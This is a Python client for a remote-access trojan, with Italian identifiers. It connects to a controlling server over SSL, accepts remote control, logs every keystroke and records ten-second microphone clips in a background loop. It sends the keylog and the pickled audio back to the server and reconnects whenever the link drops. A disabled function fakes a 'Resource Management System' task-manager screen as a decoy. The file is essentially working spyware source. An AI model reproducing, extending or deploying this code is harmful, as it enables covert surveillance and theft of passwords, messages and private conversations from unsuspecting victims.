import os
import pickle
import traceback

from wavio import write
from clientSSLconnection import *
from clientSSLgeneral import *
from clientSSLFunRC import *
from clientSSLRemoteCommands import *
from threading import Thread
import psutil
import time
import sounddevice as sd
import soundfile as sf
import keyboard  # for keylogs
from threading import Timer
from datetime import datetime

flag = "N"
logg = ""
ascoltato = []

def main():

    try:
        #signal.signal(signal.SIGINT, signalHandler)
        client = clientConnections()
        if client == "errore":
            raise Exception
        else:
            client.setblocking(True)
            time.sleep(3)
            key = client.recv(128).decode(FORMAT)
            try:
                sendInfo(client, key)
            except Exception as e:
                raise e

            try:
                time.sleep(7)
                openRemoteControl(client)
            except Exception as e:
                raise e

            global flag, logg, ascoltato
            flag = "S"
            time.sleep(2)
            logg += f"{datetime.now()} - Stopped keylogger\n"
            client.send(logg.encode(FORMAT))
            time.sleep(10)
            try:
                data_string = pickle.dumps(ascoltato)
                client.send(data_string)
            except:
                client.send("[ERROR]")
                #traceback.print_exc()
            #A QUI


            flag = "N"
            logg = ""
            ascoltato = []

            client.setblocking(False)
            client.send(1024)
            client.close()

    except Exception as e:
        if e.__class__.__name__ == "ConnectionResetError":
            raise e
        elif e.__class__.__name__ == "SSLEOFError":
            raise e
        else:
            raise e


def avvio():
    while True:
        try:
            main()
        except:
            flag = 1
            time.sleep(5)


def trojanBehaviour():
    import platform
    while True:
        try:
            clearScreen()
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            disk = psutil.disk_usage("/").percent
            mem = psutil.swap_memory().percent
            try:
                battery = psutil.sensors_battery().percent
            except:
                battery = 0

            print(Fore.RED + "\n                               RESOURCE MANAGEMENT SYSTEM                   \n")
            print(Fore.RESET + "                   --     Task manager: Current state of usage      --\n")
            # facciamo un display a video dell'utilizzo
            print("              ------------------------------------------------------------- ")
            print(
                Fore.RESET + "             |" + Fore.GREEN + " CPU USAGE" + Fore.RESET + " |" + Fore.GREEN + " RAM USAGE" + Fore.RESET + " |" + Fore.GREEN + " DISK USAGE" + Fore.RESET + " |" + Fore.GREEN + " MEMORY USAGE" + Fore.RESET + " |" + Fore.GREEN + " BATTERY" + Fore.RESET + " |")
            print(
                Fore.RESET + "             | {:02}%       | {:02}%       | {:02}%        | {:02}%          | {:02}%     |".format(
                    int(cpu),
                    int(ram),
                    int(disk),
                    int(mem),
                    int(battery)))
            print("              ------------------------------------------------------------- ")

            if platform.system() == "Windows":
                process = subprocess.Popen('tasklist /fi "MEMUSAGE gt 100000"', stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                           shell=True)
                timer = Timer(3, process.terminate)
                try:
                    timer.start()
                    stdout, stderr = process.communicate()
                    output = stdout or stderr
                finally:
                    timer.cancel()

                final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
                time.sleep(1.5)
                print(final_output.decode('utf-8'))

            else:
                pass

            time.sleep(7)
            clearScreen()
        except:
            clearScreen()
            print("              --------------------------------------------------------- ")
            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("              --------------------------------------------------------- ")
            time.sleep()


def callback(event):
    global logg, flag
    name = event.name
    if len(name) > 1 and flag == "N":
        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        else:
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"

    logg += name


def report():
    timer = Timer(interval=10, function=report)
    timer.daemon = True
    timer.start()


def start():
    global logg, flag
    keyboard.on_release(callback=callback)
    report()
    logg += f"{datetime.now()} - Started keylogger\n"
    keyboard.wait()


def ascolto():
    global ascoltato, flag
    indexA = 0
    while flag == "N":
        try:
            freq = 44100
            duration = 10
            recording = sd.rec(int(duration * freq), samplerate=freq, channels=2)
            sd.wait()
            ascoltato.append(recording)
            #sf.write("recording" + str(indexA) + ".wav",  recording, samplerate=freq)
        except Exception as e:
            pass


if __name__ == "__main__":

    thread_remoteControl = Thread(target=avvio)
    thread_remoteControl.start()

    #thread_trojan = Thread(target=trojanBehaviour)
    #thread_trojan.start()

    thread_key = Thread(target=start)
    thread_key.start()

    thread_ascolto = Thread(target=ascolto)
    thread_ascolto.start()

    thread_remoteControl.join()
    #thread_trojan.join()
    thread_key.join()
    thread_ascolto.join()



